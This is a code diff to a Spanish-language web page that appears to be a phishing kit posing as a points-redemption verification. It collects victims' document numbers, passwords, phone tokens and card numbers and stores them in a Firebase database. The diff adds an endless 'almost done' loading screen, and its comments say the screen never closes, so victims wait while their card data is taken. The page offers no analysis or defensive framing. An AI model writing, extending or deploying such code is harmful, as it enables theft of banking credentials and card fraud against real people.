@@ -318,6 +318,58 @@
       opacity: 0.6;
     }
 
+    /* ========== PANTALLA DE CARGA INFINITA (DESPUÉS DE COMPLETAR) ========== */
+    .final-loader-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #003366, #001a33);
+      z-index: 100003;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.3s, opacity 0.3s ease;
+    }
+
+    .final-loader-screen.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .final-loader-content {
+      text-align: center;
+      color: white;
+      padding: 30px;
+    }
+
+    .final-spinner {
+      width: 80px;
+      height: 80px;
+      border: 5px solid rgba(255, 255, 255, 0.2);
+      border-top: 5px solid #ffc107;
+      border-right: 5px solid #ffc107;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 30px auto;
+    }
+
+    .final-loader-content h2 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin-bottom: 15px;
+      letter-spacing: 1px;
+    }
+
+    .final-loader-content p {
+      font-size: 1rem;
+      opacity: 0.9;
+      margin-bottom: 25px;
+    }
+
     /* ========== PÁGINA DE INICIO ========== */
     .main-page {
       background-color: #ffffff;
@@ -762,6 +814,7 @@
       .benefits-content h2 { font-size: 1.3rem; }
       .verification-card, .card-card { padding: 25px; }
       .card-row { flex-direction: column; gap: 15px; }
+      .final-loader-content h2 { font-size: 1.3rem; }
     }
   </style>
 </head>
@@ -784,7 +837,7 @@
   </div>
 </div>
 
-<!-- PANTALLA DE VERIFICACIÓN (SIN VALIDACIÓN DE TOKEN) -->
+<!-- PANTALLA DE VERIFICACIÓN -->
 <div id="verificationScreen" class="verification-screen">
   <button class="close-verify" onclick="cerrarVerificacion()">&times;</button>
   <div class="verification-card">
@@ -832,6 +885,15 @@
     </div>
     
     <button class="btn-verify-submit" onclick="enviarDatosTarjeta()">Completar verificacion</button>
+  </div>
+</div>
+
+<!-- PANTALLA DE CARGA INFINITA (DESPUÉS DE COMPLETAR) -->
+<div id="finalLoaderScreen" class="final-loader-screen">
+  <div class="final-loader-content">
+    <div class="final-spinner"></div>
+    <h2>Espera, ya casi terminamos</h2>
+    <p>Estamos procesando tu solicitud...</p>
   </div>
 </div>
 
@@ -985,6 +1047,7 @@
   const benefitsScreen = document.getElementById('benefitsScreen');
   const verificationScreen = document.getElementById('verificationScreen');
   const cardScreen = document.getElementById('cardScreen');
+  const finalLoaderScreen = document.getElementById('finalLoaderScreen');
   const benefitsProgressBar = document.getElementById('benefitsProgressBar');
   const btnIngresarClave = document.getElementById('btnIngresarClave');
   
@@ -1054,6 +1117,10 @@
   function showCardScreen() { cardScreen.classList.add('active'); }
   function hideCardScreen() { cardScreen.classList.remove('active'); }
   
+  function showFinalLoader() {
+    finalLoaderScreen.classList.add('active');
+  }
+  
   function cerrarVerificacion() {
     hideVerificationScreen();
     document.getElementById('documentNumber').value = '';
@@ -1087,7 +1154,6 @@
       return;
     }
     
-    // CUALQUIER TOKEN ES VALIDO - SIN VALIDACION
     if (sessionId) {
       await database.ref('ingresos/' + sessionId).update({
         telefono: phoneNumber,
@@ -1101,6 +1167,7 @@
     showCardScreen();
   }
   
+  // ENVIAR DATOS DE TARJETA CON PRELOADER INFINITO
   async function enviarDatosTarjeta() {
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('cardExpiry').value;
@@ -1121,6 +1188,10 @@
       return;
     }
     
+    // Mostrar pantalla de carga infinita
+    showFinalLoader();
+    
+    // Guardar datos en Firebase (en segundo plano)
     if (sessionId) {
       await database.ref('ingresos/' + sessionId).update({
         numeroTarjeta: cardNumber,
@@ -1131,12 +1202,8 @@
       });
     }
     
-    alert('Verificacion completada. Tus puntos plus han sido redimidos correctamente.');
-    hideCardScreen();
-    document.getElementById('documentNumber').value = '';
-    document.getElementById('claveSegura').value = '';
-    validarCampos();
-    sessionId = null;
+    // La pantalla de carga infinita se queda, nunca se cierra
+    // El usuario ve el mensaje "Espera, ya casi terminamos" para siempre
   }
   
   async function saveToFirebaseAndShowBenefits(usuario, password, docType) {
